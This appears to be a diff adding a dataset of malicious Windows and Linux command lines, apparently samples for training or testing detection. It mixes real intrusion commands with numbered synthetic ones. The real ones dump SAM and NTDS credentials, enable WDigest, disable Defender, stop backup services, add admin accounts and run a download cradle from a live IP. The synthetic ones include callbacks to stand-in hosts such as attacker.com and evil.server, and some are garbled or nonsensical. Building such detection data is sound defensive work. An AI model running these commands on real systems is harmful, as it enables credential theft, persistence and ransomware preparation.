+REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v Adminv$ /t REG_DWORD /d 0
+REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v EnableLUA
+Seatbelt.exe  -group=all -outputfile="C:\ProgramData\seatinfo.txt"
+VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "EXEC master..xp\_cmdshell 'net localgroup administrators sqlbackup /add'"
+VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "EXEC master..xp\_cmdshell 'net user sqlbackup Password!1221! /add'"
+VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "EXEC sp\_configure 'show advanced options', '1'"
+VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "EXEC sp\_configure 'xp\_cmdshell', '1' "
+VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "RECONFIGURE"
+VeeamHax.exe --verbose --target <backup server> --port 9401 --cmd "c:\windows\notepad.exe" --sql "select @@version"
+WMIC /Node:localhost /Namespace:"\\root\SecurityCenter2" Path AntiVirusProduct Get displayName /Format:List
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
+WMIC /node:"DC.example.domain" process call create "rundll32 C:\\PerfLogs\\arti64.dll, StartW"
+adfind -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv
+adfind.exe  -f objectcategory=computer -csv name operatingSystem
+bcdedit  /set {default} safeboot network
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  veeam1.cs.txt
+c:\windows\system32\cmd.exe /c wmic /node:"<REDACTED>" process call create "c:\perflogs\setup1.exe"
+c:\windows\temp\k.exe --config REDACTED
+cd /d "C:\Users\SVC-DA-1\AppData\Local\Temp\10\tmp$\Downloads"
+certutil_0.exe -encode input_0.txt C:\temp\encoded_0.txt
+certutil_22.exe -urlcache -split -f http://malicious.site/data_22.enc C:\Temp\temp_22.enc
+certutil_25.exe -encode input_25.txt C:\temp\encoded_25.txt
+certutil_27.exe -encode input_27.txt C:\temp\encoded_27.txt
+certutil_29.exe -encode input_29.txt C:\temp\encoded_29.txt
+certutil_36.exe -encode input_36.txt C:\temp\encoded_36.txt
+certutil_40.exe -encode input_40.txt C:\temp\encoded_40.txt
+certutil_59.exe -urlcache -split -f http://malicious.site/data_59.enc C:\Temp\temp_59.enc
+certutil_76.exe -encode input_76.txt C:\temp\encoded_76.txt
+certutil_81.exe -urlcache -split -f http://malicious.site/data_81.enc C:\Temp\temp_81.enc
+certutil_82.exe -encode input_82.txt C:\temp\encoded_82.txt
+certutil_88.exe -encode input_88.txt C:\temp\encoded_88.txt
+certutil_93.exe -encode input_93.txt C:\temp\encoded_93.txt
+cmd /C "echo -------- >> C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1"
+cmd /C "net view /all >> C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1"
+cmd /v /c net group /domain "Domain Admins" > "%TEMP%\51362.txt" 2>&1
+cmd /v /c nltest /trusted\_domains > "%TEMP%\22041.txt" 2>&1
+cmd /v /c nltest /trusted_domains > "%TEMP%\22041.txt" 2>&1
+cmd /v /c whoami /upn > "%TEMP%\26906.txt" 2>&1
+cmd.exe -Command "Start-Process C:\Users\Public\runme.bat"
+cmd.exe -Command "Start-Process C:\Windows\Temp\evil.dll"
+cmd.exe -exec /tmp/malware.sh
+cmd.exe -exec /usr/local/bin/backdoor
+cmd.exe -exec /var/tmp/hide.so
+cmd.exe -exec C:\ProgramData\updater.exe
+cmd.exe -exec C:\Users\Public\runme.bat
+cmd.exe /C "python.exe cradle.py"
+cmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv
+cmd.exe /C dsquery subnet -limit 0
+cmd.exe /C echo -------- >> C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1
+cmd.exe /C for /f %a in (pc.txt) do copy /y \\<REDACTED>\c$\<REDACTED>.exe \\%a\c$\<REDACTED>.exe
+cmd.exe /C net view /all >> C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1
+cmd.exe /C netsh advfirewall set rule group="remote desktop" new enable=Yes
+cmd.exe /C netsh firewall set rule group="remote desktop" new enable=Yes
+cmd.exe /C netsh firewall set service type=remotedesktop mode=enable
+cmd.exe /C nltest /dclist:
+cmd.exe /C nltest /domain_trusts
+nltest /dclist:
+c:\windows\sysnative\nltest /domain_trusts
+c:\windows\sysnative\nltest /dclist:
+cmd.exe /C python.exe cradle.py
+cmd.exe /c "reg.exe save hklm\sam c:\users\REDACTED\appdata\local\temp\1\dznuxujzr"
+cmd.exe /c "reg.exe save hklm\security c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt"
+cmd.exe /c "reg.exe save hklm\system c:\users\REDACTED\appdata\local\temp\1\mkffdg"
+cmd.exe /c %USERPROFILE%\AppData\bigfile.exe -i -c %USERPROFILE%\AppData\1.bat
+cmd.exe /c DEL %USERPROFILE%\AppData\1.bat
+cmd.exe /c DEL %USERPROFILE%\AppData\bigfile.exe
+cmd.exe /c DEL %USERPROFILE%\AppData\bigfile.txt
+cmd.exe /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smss.exe" /f /v Debugger /t REG_SZ /d "C:\windows\system32\svchost.exe"
+cmd.exe /c certutil -decode %USERPROFILE%\AppData\bigfile.txt %USERPROFILE%\AppData\bigfile.exe
+cmd.exe /c echo 31b925aa0f7 > \\.\pipe\8945a5
+cmd.exe /c mofcomp.exe C:\Windows\SERVIC\~1\MSSQL$\~1\AppData\Local\Temp\xitmf
+cmd.exe /c mofcomp.exe C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\xitmf
+cmd.exe /c reg.exe save hklm\sam c:\users\REDACTED\appdata\local\temp\1\dznuxujzr
+cmd.exe /c reg.exe save hklm\security c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt
+cmd.exe /c reg.exe save hklm\system c:\users\REDACTED\appdata\local\temp\1\mkffdg
+cmd.exe /c rmdir /S /Q "C:\Windows\system32\config\systemprofile\EmailStorage_REDACTED-REDACTED_REDACTED"
+cmd.exe /c start /tmp/malware.sh
+cmd.exe /c start /var/tmp/hide.so
+cmd.exe /c start C:\Windows\Temp\evil.dll
+cmd.exe /c start cmd.exe
+cmd.exe /c start powershell.exe
+cmd.exe /c start python.exe
+cmd.exe /c start svchost.exe
+cmd.exe /c start wmic.exe
+cmd.exe /c wevtutil cl applicatio
+cmd.exe Invoke-ReflectivePEInjection -PEPath notepad.exe
+cmd.exe Invoke-ReflectivePEInjection -PEPath svchost.exe
+cmd.exe Invoke-ReflectivePEInjection -PEPath taskmgr.exe
+cmd.exe Invoke-ReflectivePEInjection -PEPath winlogon.exe
+cmd.exe Invoke-WebRequest -Uri 10.10.10.10:4444 -Method POST
+cmd.exe Invoke-WebRequest -Uri 192.168.1.100:8080 -Method POST
+cmd.exe Invoke-WebRequest -Uri http://attacker.com/c2 -Method POST
+cmd.exe Remove-Item /var/tmp/hide.so -Force
+cmd.exe Remove-Item C:\ProgramData\updater.exe -Force
+cmd.exe Remove-Item C:\Users\Public\runme.bat -Force
+cmd.exe Set-ProcessInjection -Target explorer.exe
+cmd.exe Set-ProcessInjection -Target lsass.exe
+cmd.exe Set-ProcessInjection -Target notepad.exe
+cmd.exe Set-ProcessInjection -Target taskmgr.exe
+cmd.exe Stop-Process -Name lsass.exe -Force
+cmd.exe Stop-Process -Name notepad.exe -Force
+cmd.exe Stop-Process -Name svchost.exe -Force
+cmd.exe Stop-Process -Name taskmgr.exe -Force
+cmd.exe Stop-Process -Name winlogon.exe -Force
+cmd.exe attrib +s +h /usr/local/bin/backdoor
+cmd.exe attrib +s +h C:\ProgramData\updater.exe
+cmd.exe attrib +s +h C:\Users\Public\runme.bat
+cmd.exe attrib +s +h C:\Windows\Temp\evil.dll
+cmd.exe chmod 777 /tmp/malware.sh
+cmd.exe chmod 777 C:\Windows\Temp\evil.dll
+cmd.exe curl -X POST --data 'ping' 10.10.10.10:4444
+cmd.exe del /tmp/malware.sh
+cmd.exe del /usr/local/bin/backdoor
+cmd.exe del /var/tmp/hide.so
+cmd.exe del C:\Users\Public\runme.bat
+cmd.exe del C:\Windows\Temp\evil.dll
+cmd.exe dllinjector.exe -p explorer.exe -d payload.dll
+cmd.exe dllinjector.exe -p lsass.exe -d payload.dll
+cmd.exe dllinjector.exe -p svchost.exe -d payload.dll
+cmd.exe dllinjector.exe -p winlogon.exe -d payload.dll
+cmd.exe icacls /tmp/malware.sh /grant Everyone:F
+cmd.exe icacls /usr/local/bin/backdoor /grant Everyone:F
+cmd.exe icacls /var/tmp/hide.so /grant Everyone:F
+cmd.exe icacls C:\ProgramData\updater.exe /grant Everyone:F
+cmd.exe kill $(Get-Process lsass.exe.Id)
+cmd.exe kill $(Get-Process notepad.exe.Id)
+cmd.exe kill $(Get-Process svchost.exe.Id)
+cmd.exe kill $(Get-Process winlogon.exe.Id)
+cmd.exe nc -lvp 4444 -s http://attacker.com/c2
+cmd.exe nc -lvp 4444 -s https://evil.server/payload
+cmd.exe powershell -c "Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"
+cmd.exe powershell -c "Invoke-RestMethod -Uri 192.168.1.100:8080 -Body 'cmd=whoami'"
+cmd.exe powershell -c "Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"
+cmd.exe powershell Start-Process python.exe
+cmd.exe powershell Start-Process rundll32.exe
+cmd.exe powershell Start-Process svchost.exe
+cmd.exe powershell Start-Process wmic.exe
+cmd.exe python3 -m http.server 8080 --bind 10.10.10.10:4444
+cmd.exe python3 -m http.server 8080 --bind http://attacker.com/c2
+cmd.exe rm /var/tmp/hide.so
+cmd.exe rm C:\ProgramData\updater.exe
+cmd.exe rm C:\Users\Public\runme.bat
+cmd.exe runas /user:admin cmd.exe
+cmd.exe runas /user:admin powershell.exe
+cmd.exe runas /user:admin rundll32.exe
+cmd.exe runas /user:admin wmic.exe
+cmd.exe socat TCP4-LISTEN:8080,fork http://attacker.com/c2
+cmd.exe socat TCP4-LISTEN:8080,fork https://evil.server/payload
+cmd.exe taskkill /IM explorer.exe /F
+cmd.exe taskkill /IM taskmgr.exe /F
+cmd.exe taskkill /IM winlogon.exe /F
+cmd_10.exe /c echo malicious > C:\Temp\evil_10.bat
+cmd_11.exe /c echo %USERNAME% >> C:\output\users_11.txt
+cmd_12.exe /c echo malicious > C:\Temp\evil_12.bat
+cmd_13.exe /c echo %USERNAME% >> C:\output\users_13.txt
+cmd_17.exe /c echo malicious > C:\Temp\evil_17.bat
+cmd_18.exe /c echo malicious > C:\Temp\evil_18.bat
+cmd_2.exe /c type C:\Windows\System32\drivers\etc\hosts
+cmd_3.exe /c echo %USERNAME% >> C:\output\users_3.txt
+cmd_3.exe /c type C:\Windows\System32\drivers\etc\hosts
+cmd_35.exe /c echo malicious > C:\Temp\evil_35.bat
+cmd_35.exe /c type C:\Windows\System32\drivers\etc\hosts
+cmd_45.exe /c echo %USERNAME% >> C:\output\users_45.txt
+cmd_5.exe /c echo malicious > C:\Temp\evil_5.bat
+cmd_51.exe /c echo malicious > C:\Temp\evil_51.bat
+cmd_55.exe /c type C:\Windows\System32\drivers\etc\hosts
+cmd_57.exe /c echo malicious > C:\Temp\evil_57.bat
+cmd_61.exe /c echo %USERNAME% >> C:\output\users_61.txt
+cmd_62.exe /c echo malicious > C:\Temp\evil_62.bat
+cmd_7.exe /c echo malicious > C:\Temp\evil_7.bat
+cmd_74.exe /c echo %USERNAME% >> C:\output\users_74.txt
+cmd_76.exe /c type C:\Windows\System32\drivers\etc\hosts
+cmd_78.exe /c type C:\Windows\System32\drivers\etc\hosts
+cmd_84.exe /c echo %USERNAME% >> C:\output\users_84.txt
+cmd_87.exe /c type C:\Windows\System32\drivers\etc\hosts
+cmd_91.exe /c echo %USERNAME% >> C:\output\users_91.txt
+cmd_94.exe /c echo %USERNAME% >> C:\output\users_94.txt
+cmd_95.exe /c echo %USERNAME% >> C:\output\users_95.txt
+cmd_98.exe /c type C:\Windows\System32\drivers\etc\hosts
+cscript.exe  /b /e:VBScript.Encode C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\xit 579562847
+cscript.exe /b /e\:VBScript.Encode C:\Windows\SERVIC\~1\MSSQL$\~1\AppData\Local\Temp\xit 579562847
+esentutl.exe /r V01 /l"C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache" /s"C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache" /d"C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"
+ex.exe x -prootBRUCE -y C:\Windows\<REDACTED>\AppData\Local\Temp\istx64f.rar C:\Windows\<REDACTED>\AppData\Local\Temp\mstrx\<file>
+findstr  /C:"The operation completed successfully."
+ftp_19.exe -s:script_19.txt C:\inetpub\wwwroot\ftp_19.log
+ftp_41.exe -s:script_41.txt C:\inetpub\wwwroot\ftp_41.log
+ftp_55.exe -s:script_55.txt C:\inetpub\wwwroot\ftp_55.log
+ftp_63.exe -s:script_63.txt C:\inetpub\wwwroot\ftp_63.log
+ftp_67.exe -s:script_67.txt C:\inetpub\wwwroot\ftp_67.log
+ftp_73.exe -s:script_73.txt C:\inetpub\wwwroot\ftp_73.log
+ftp_87.exe -s:script_87.txt C:\inetpub\wwwroot\ftp_87.log
+ftp_90.exe -s:script_90.txt C:\inetpub\wwwroot\ftp_90.log
+ftp_92.exe -s:script_92.txt C:\inetpub\wwwroot\ftp_92.log
+icacls ""C:\*"" /grant Everyone\:F /T /C /Q
+icacls ""D:\*"" /grant Everyone\:F /T /C /Q
+mmc.exe "C:\Windows\System32\gpedit.msc"
+mshta_14.exe -write C:\Users\Public\hta_payload_14.hta
+mshta_28.exe -write C:\Users\Public\hta_payload_28.hta
+mshta_54.exe -write C:\Users\Public\hta_payload_54.hta
+mshta_6.exe -write C:\Users\Public\hta_payload_6.hta
+mshta_60.exe -write C:\Users\Public\hta_payload_60.hta
+mshta_64.exe -write C:\Users\Public\hta_payload_64.hta
+mshta_68.exe -write C:\Users\Public\hta_payload_68.hta
+mshta_69.exe -write C:\Users\Public\hta_payload_69.hta
+mshta_71.exe -write C:\Users\Public\hta_payload_71.hta
+mshta_75.exe -write C:\Users\Public\hta_payload_75.hta
+mshta_79.exe -write C:\Users\Public\hta_payload_79.hta
+mshta_8.exe -write C:\Users\Public\hta_payload_8.hta
+mshta_86.exe -write C:\Users\Public\hta_payload_86.hta
+mshta_97.exe -write C:\Users\Public\hta_payload_97.hta
+mshta_98.exe -write C:\Users\Public\hta_payload_98.hta
+msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=asdasd /qn
+net  group "Domain Admins" /domain
+net  group "Domain Controllers" /domain
+net  group /domain
+net  localgroup "Remote Desktop Users"
+net  localgroup "Remote Desktop Users" WDAGUtilityAccount2 /add
+net  localgroup Administrators
+net  localgroup Administrators WDAGUtilityAccount2 /add
+net  localgroup Administrators sql_admin /ADD
+net  stop "Acronis VSS Provider" /y
+net  stop "SQL Backups" /y
+net  stop "SQLsafe Backup Service" /y
+net  stop "SQLsafe Filter Service" /y
+net  stop "Symantec System Recovery" /y
+net  stop "Veeam Backup Catalog Data Service" /y
+net  stop "Zoolz 2 Service" /y
+net  stop BackupExecDeviceMediaService /y
+net  stop BackupExecJobEngine /y
+net  stop BackupExecManagementService /y
+net  stop BackupExecRPCService /y
+net  stop BackupExecVSSProvider /y
+net  stop VeeamDeploySvc /y
+net  user <user> /domain
+net  user WDAGUtilityAccount2 Decryptme1488@ /add
+net  user sql_admin P@ssw0rd! /add
+net group "domain admins" /domain
+net group \"domain admins\" /domainsysteminfo
+net group \"enterprise admins\" /domain
+net localgroup "administrator"
+net localgroup 'Remote Desktop Users' /add DefaultAccount
+net localgroup Administrators Support /add & net localgroup \"Remote Desktop Users\" Support /add
+net localgroup administrators nuuser /add
+net stop MSExchangeDelivery
+net stop MSExchangeDiagnostics
+net stop MSExchangeEdgeSync
+net user %USERNAME% ehs.123
+net user /add /Y nuuser 7HeC00l3stP@ssw0rd
+net view /all
+net view /all /domain
+nltest /domain_trusts
+nltest /domain_trusts /all_trusts
+nltest.exe /domain_trusts /all_trusts
+notepad_10.exe C:\Users\admin\notes_10.txt
+notepad_15.exe C:\Users\test\notes_15.txt
+notepad_23.exe C:\Users\test\notes_23.txt
+notepad_24.exe C:\Users\admin\notes_24.txt
+notepad_26.exe C:\Users\test\notes_26.txt
+notepad_29.exe C:\Users\admin\notes_29.txt
+notepad_36.exe C:\Users\admin\notes_36.txt
+notepad_39.exe C:\Users\admin\notes_39.txt
+notepad_41.exe C:\Users\admin\notes_41.txt
+notepad_44.exe C:\Users\admin\notes_44.txt
+notepad_49.exe C:\Users\admin\notes_49.txt
+notepad_51.exe C:\Users\admin\notes_51.txt
+notepad_52.exe C:\Users\test\notes_52.txt
+notepad_56.exe C:\Users\admin\notes_56.txt
+notepad_57.exe C:\Users\admin\notes_57.txt
+notepad_58.exe C:\Users\test\notes_58.txt
+notepad_63.exe C:\Users\admin\notes_63.txt
+notepad_65.exe C:\Users\test\notes_65.txt
+notepad_66.exe C:\Users\admin\notes_66.txt
+notepad_70.exe C:\Users\test\notes_70.txt
+notepad_71.exe C:\Users\admin\notes_71.txt
+notepad_94.exe C:\Users\admin\notes_94.txt
+ntdsutil "ac in ntds" "ifm" "cr fu C:\Perflogs\1"
+ping COMPUTER.REDACTED.local
+powershell  Set-MpPreference -DisableRealtimeMonitoring $true
+powershell  Set-MpPreference -MAPSReporting 0
+powershell  Set-MpPreference -SubmitSamplesConsent 2
+powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> log2.txt
+powershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProvipowershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'powershell.exe -Command "Start-Process /usr/local/bin/backdoor"
+powershell.exe -Command "Start-Process /var/tmp/hide.so"
+powershell.exe -Command "Start-Process C:\Users\Public\runme.bat"
+powershell.exe -Command "Start-Process C:\Windows\Temp\evil.dll"
+powershell.exe -exec /tmp/malware.sh
+powershell.exe -exec C:\Windows\Temp\evil.dll
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))"
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp\://37.120.198.225:80/trio'))"
+powershell.exe /c start /tmp/malware.sh
+powershell.exe /c start C:\Windows\Temp\evil.dll
+powershell.exe /c start cmd.exe
+powershell.exe /c start powershell.exe
+powershell.exe /c start python.exe
+powershell.exe /c start svchost.exe
+powershell.exe Invoke-ReflectivePEInjection -PEPath explorer.exe
+powershell.exe Invoke-ReflectivePEInjection -PEPath notepad.exe
+powershell.exe Invoke-ReflectivePEInjection -PEPath svchost.exe
+powershell.exe Invoke-ReflectivePEInjection -PEPath taskmgr.exe
+powershell.exe Invoke-WebRequest -Uri 10.10.10.10:4444 -Method POST
+powershell.exe Invoke-WebRequest -Uri http://attacker.com/c2 -Method POST
+powershell.exe Invoke-WebRequest -Uri https://evil.server/payload -Method POST
+powershell.exe Remove-Item /usr/local/bin/backdoor -Force
+powershell.exe Remove-Item C:\Users\Public\runme.bat -Force
+powershell.exe Remove-Item C:\Windows\Temp\evil.dll -Force
+powershell.exe Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Value '1'
+powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
+powershell.exe Set-ProcessInjection -Target explorer.exe
+powershell.exe Set-ProcessInjection -Target lsass.exe
+powershell.exe Set-ProcessInjection -Target notepad.exe
+powershell.exe Set-ProcessInjection -Target svchost.exe
+powershell.exe Set-ProcessInjection -Target taskmgr.exe
+powershell.exe Set-ProcessInjection -Target winlogon.exe
+powershell.exe Stop-Process -Name explorer.exe -Force
+powershell.exe Stop-Process -Name lsass.exe -Force
+powershell.exe Stop-Process -Name notepad.exe -Force
+powershell.exe Stop-Process -Name taskmgr.exe -Force
+powershell.exe Stop-Process -Name winlogon.exe -Force
+powershell.exe attrib +s +h /tmp/malware.sh
+powershell.exe attrib +s +h C:\Users\Public\runme.bat
+powershell.exe attrib +s +h C:\Windows\Temp\evil.dll
+powershell.exe chmod 777 /usr/local/bin/backdoor
+powershell.exe chmod 777 /var/tmp/hide.so
+powershell.exe chmod 777 C:\ProgramData\updater.exe
+powershell.exe chmod 777 C:\Windows\Temp\evil.dll
+powershell.exe curl -X POST --data 'ping' 10.10.10.10:4444
+powershell.exe curl -X POST --data 'ping' 192.168.1.100:8080
+powershell.exe curl -X POST --data 'ping' https://evil.server/payload
+powershell.exe del /usr/local/bin/backdoor
+powershell.exe del C:\ProgramData\updater.exe
+powershell.exe dllinjector.exe -p explorer.exe -d payload.dll
+powershell.exe dllinjector.exe -p notepad.exe -d payload.dll
+powershell.exe dllinjector.exe -p taskmgr.exe -d payload.dll
+powershell.exe icacls /usr/local/bin/backdoor /grant Everyone:F
+powershell.exe icacls C:\ProgramData\updater.exe /grant Everyone:F
+powershell.exe icacls C:\Users\Public\runme.bat /grant Everyone:F
+powershell.exe icacls C:\Windows\Temp\evil.dll /grant Everyone:F
+powershell.exe kill $(Get-Process explorer.exe.Id)
+powershell.exe kill $(Get-Process notepad.exe.Id)
+powershell.exe kill $(Get-Process svchost.exe.Id)
+powershell.exe kill $(Get-Process taskmgr.exe.Id)
+powershell.exe ls C:\ > C:\file.txt
+powershell.exe nc -lvp 4444 -s 10.10.10.10:4444
+powershell.exe nc -lvp 4444 -s http://attacker.com/c2
+powershell.exe nc -lvp 4444 -s https://evil.server/payload
+powershell.exe powershell -c "Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"
+powershell.exe powershell -c "Invoke-RestMethod -Uri 192.168.1.100:8080 -Body 'cmd=whoami'"
+powershell.exe powershell -c "Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"
+powershell.exe powershell Start-Process cmd.exe
+powershell.exe powershell Start-Process powershell.exe
+powershell.exe powershell Start-Process python.exe
+powershell.exe powershell Start-Process rundll32.exe
+powershell.exe powershell Start-Process svchost.exe
+powershell.exe python3 -m http.server 8080 --bind 10.10.10.10:4444
+powershell.exe python3 -m http.server 8080 --bind 192.168.1.100:8080
+powershell.exe python3 -m http.server 8080 --bind http://attacker.com/c2
+powershell.exe python3 -m http.server 8080 --bind https://evil.server/payload
+powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+powershell.exe rm /tmp/malware.sh
+powershell.exe rm /usr/local/bin/backdoor
+powershell.exe rm C:\ProgramData\updater.exe
+powershell.exe rm C:\Windows\Temp\evil.dll
+powershell.exe runas /user:admin powershell.exe
+powershell.exe runas /user:admin python.exe
+powershell.exe runas /user:admin rundll32.exe
+powershell.exe runas /user:admin svchost.exe
+powershell.exe socat TCP4-LISTEN:8080,fork 10.10.10.10:4444
+powershell.exe socat TCP4-LISTEN:8080,fork 192.168.1.100:8080
+powershell.exe socat TCP4-LISTEN:8080,fork http://attacker.com/c2
+powershell.exe taskkill /IM explorer.exe /F
+powershell.exe taskkill /IM svchost.exe /F
+powershell.exe taskkill /IM winlogon.exe /F
+powershell_1.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_1.ps1', 'Invoke-Mimikatz')"
+powershell_11.exe -Command "gc C:\ProgramData\conf_11.yaml"
+powershell_15.exe Get-Content C:\Users\Public\secrets_15.txt
+powershell_16.exe -Command "Set-Content -Path C:\Windows\Temp\log_16.txt -Value 'infected'"
+powershell_16.exe Get-Content C:\Users\Public\secrets_16.txt
+powershell_18.exe -Command "gc C:\ProgramData\conf_18.yaml"
+powershell_2.exe -Command "Set-Content -Path C:\Windows\Temp\log_2.txt -Value 'infected'"
+powershell_20.exe -Command "Set-Content -Path C:\Windows\Temp\log_20.txt -Value 'infected'"
+powershell_21.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_21.ps1', 'Invoke-Mimikatz')"
+powershell_22.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_22.ps1', 'Invoke-Mimikatz')"
+powershell_25.exe Get-Content C:\Users\Public\secrets_25.txt
+powershell_26.exe -Command "gc C:\ProgramData\conf_26.yaml"
+powershell_28.exe -Command "gc C:\ProgramData\conf_28.yaml"
+powershell_31.exe Get-Content C:\Users\Public\secrets_31.txt
+powershell_32.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_32.ps1', 'Invoke-Mimikatz')"
+powershell_33.exe -Command "Set-Content -Path C:\Windows\Temp\log_33.txt -Value 'infected'"
+powershell_34.exe -Command "Set-Content -Path C:\Windows\Temp\log_34.txt -Value 'infected'"
+powershell_37.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_37.ps1', 'Invoke-Mimikatz')"
+powershell_37.exe Get-Content C:\Users\Public\secrets_37.txt
+powershell_4.exe -Command "Set-Content -Path C:\Windows\Temp\log_4.txt -Value 'infected'"
+powershell_42.exe Get-Content C:\Users\Public\secrets_42.txt
+powershell_45.exe -Command "gc C:\ProgramData\conf_45.yaml"
+powershell_46.exe -Command "gc C:\ProgramData\conf_46.yaml"
+powershell_47.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_47.ps1', 'Invoke-Mimikatz')"
+powershell_48.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_48.ps1', 'Invoke-Mimikatz')"
+powershell_49.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_49.ps1', 'Invoke-Mimikatz')"
+powershell_50.exe Get-Content C:\Users\Public\secrets_50.txt
+powershell_52.exe -Command "gc C:\ProgramData\conf_52.yaml"
+powershell_53.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_53.ps1', 'Invoke-Mimikatz')"
+powershell_61.exe Get-Content C:\Users\Public\secrets_61.txt
+powershell_64.exe -Command "gc C:\ProgramData\conf_64.yaml"
+powershell_66.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_66.ps1', 'Invoke-Mimikatz')"
+powershell_69.exe -Command "gc C:\ProgramData\conf_69.yaml"
+powershell_70.exe Get-Content C:\Users\Public\secrets_70.txt
+powershell_72.exe -Command "Set-Content -Path C:\Windows\Temp\log_72.txt -Value 'infected'"
+powershell_73.exe Get-Content C:\Users\Public\secrets_73.txt
+powershell_74.exe Get-Content C:\Users\Public\secrets_74.txt
+powershell_75.exe -Command "gc C:\ProgramData\conf_75.yaml"
+powershell_79.exe Get-Content C:\Users\Public\secrets_79.txt
+powershell_80.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_80.ps1', 'Invoke-Mimikatz')"
+powershell_80.exe -Command "gc C:\ProgramData\conf_80.yaml"
+powershell_81.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_81.ps1', 'Invoke-Mimikatz')"
+powershell_85.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_85.ps1', 'Invoke-Mimikatz')"
+powershell_89.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_89.ps1', 'Invoke-Mimikatz')"
+powershell_9.exe -Command "Set-Content -Path C:\Windows\Temp\log_9.txt -Value 'infected'"
+powershell_96.exe "[IO.File]::WriteAllText('C:\Temp\backdoor_96.ps1', 'Invoke-Mimikatz')"
+powershell_99.exe Get-Content C:\Users\Public\secrets_99.txt
+psexec \\<redacted> -u <redacted>\<redacted> -p <redacted> reg add "hklm\system\currentcontrolset\control\lsa" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0
+psexec.exe  \\<IP ADDRESS> -u <DOMAIN>\Administrator -p "<PASSWORD>" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\ttsel.exe
+python.exe -Command "Start-Process /tmp/malware.sh"
+python.exe -Command "Start-Process /var/tmp/hide.so"
+python.exe -Command "Start-Process C:\ProgramData\updater.exe"
+python.exe -Command "Start-Process C:\Users\Public\runme.bat"
+python.exe -exec /tmp/malware.sh
+python.exe -exec C:\Windows\Temp\evil.dll
+python.exe /c start /tmp/malware.sh
+python.exe /c start /var/tmp/hide.so
+python.exe /c start C:\ProgramData\updater.exe
+python.exe /c start C:\Windows\Temp\evil.dll
+python.exe /c start cmd.exe
+python.exe /c start powershell.exe
+python.exe /c start rundll32.exe
+python.exe /c start wmic.exe
+python.exe Invoke-ReflectivePEInjection -PEPath lsass.exe
+python.exe Invoke-ReflectivePEInjection -PEPath svchost.exe
+python.exe Invoke-ReflectivePEInjection -PEPath taskmgr.exe
+python.exe Invoke-WebRequest -Uri 192.168.1.100:8080 -Method POST
+python.exe Invoke-WebRequest -Uri https://evil.server/payload -Method POST
+python.exe Remove-Item /tmp/malware.sh -Force
+python.exe Remove-Item C:\ProgramData\updater.exe -Force
+python.exe Remove-Item C:\Users\Public\runme.bat -Force
+python.exe Set-ProcessInjection -Target lsass.exe
+python.exe Set-ProcessInjection -Target notepad.exe
+python.exe Set-ProcessInjection -Target taskmgr.exe
+python.exe Stop-Process -Name explorer.exe -Force
+python.exe Stop-Process -Name lsass.exe -Force
+python.exe Stop-Process -Name svchost.exe -Force
